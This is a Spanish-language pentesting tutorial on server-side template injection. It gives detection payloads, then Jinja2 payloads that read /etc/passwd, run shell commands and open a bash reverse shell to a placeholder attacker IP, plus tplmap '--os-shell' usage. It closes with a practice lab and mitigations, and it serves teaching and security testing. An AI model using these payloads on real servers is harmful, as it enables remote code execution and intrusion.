# Server-Side Template Injection (SSTI)

SSTI es una vulnerabilidad que aparece cuando el input del usuario se embebe directamente en una **plantilla de servidor** sin ser sanitizado. Los motores de plantillas están diseñados para ejecutar código, por lo que si un atacante puede inyectar expresiones en ellos, puede obtener ejecución de código en el servidor.

A diferencia de XSS (que afecta al navegador del cliente), SSTI ataca directamente los componentes internos del servidor.

---

## Motores de plantillas populares

| Lenguaje | Motores |
|---|---|
| PHP | Smarty, Twig |
| Java | Velocity, FreeMarker |
| Python | Jinja2, Mako, Tornado |
| JavaScript | Jade, Pug |
| Ruby | Liquid |

---

## Detección

El payload de detección universal es una expresión matemática:

```
{{7*7}}
```

Si la respuesta muestra `49` en lugar de `{{7*7}}`, el motor de plantillas está evaluando el input — la aplicación es vulnerable.

Otros payloads de detección para identificar el motor:

```
{{7*7}}          → Jinja2, Twig
${7*7}           → FreeMarker, Velocity
<%= 7*7 %>       → ERB (Ruby)
#{7*7}           → Ruby
*{7*7}           → Spring (Java)
```

```
{{'7'*7}}        → En Jinja2: devuelve '7777777'
```

**Herramientas de detección:** [Wappalyzer](https://www.wappalyzer.com) o `whatweb` para identificar el stack tecnológico:

```bash
whatweb http://target.com
```

---

## Explotación — Python / Jinja2 (Flask)

Jinja2 (usado por Flask) es el caso más frecuente en CTF y entornos de pentesting.

### Leer archivos del sistema

```python
{{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

### Ejecutar comandos

```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```

### Reverse shell

Primero, poner el listener en escucha:
```bash
nc -nlvp 443
```

Luego inyectar el payload (el `%26` es `&` URL-encoded):
```python
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('bash -c "bash -i >%26 /dev/tcp/<IP_ATACANTE>/443 0>%261"').read() }}
```

---

## Payloads para otros motores

La referencia más completa de payloads por motor está en:
- [PayloadsAllTheThings — SSTI](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
- [HackTricks — SSTI](https://book.hacktricks.wiki/en/pentesting-web/ssti-server-side-template-injection/)

---

## Herramientas de automatización

### tplmap

Automatiza la detección y explotación de SSTI en múltiples motores:

```bash
python3 tplmap.py -u "http://target.com/page?name=test"
python3 tplmap.py -u "http://target.com/page?name=test" --os-shell
```

---

## Laboratorio para practicar

```bash
docker run -p 8089:8089 -d filipkarc/ssti-flask-hacking-playground
```

Acceder en `http://localhost:8089` y probar los payloads de Jinja2.

---

## Mitigaciones

- **No embeber input del usuario directamente en plantillas** — es la causa raíz
- Usar funciones de renderizado con entornos de sandbox (ej. `jinja2.sandbox.SandboxedEnvironment`)
- Validar y escapar el input antes de pasarlo al motor de plantillas
- Aplicar el principio de mínimo privilegio al proceso web
- Revisar qué variables del contexto son accesibles desde la plantilla
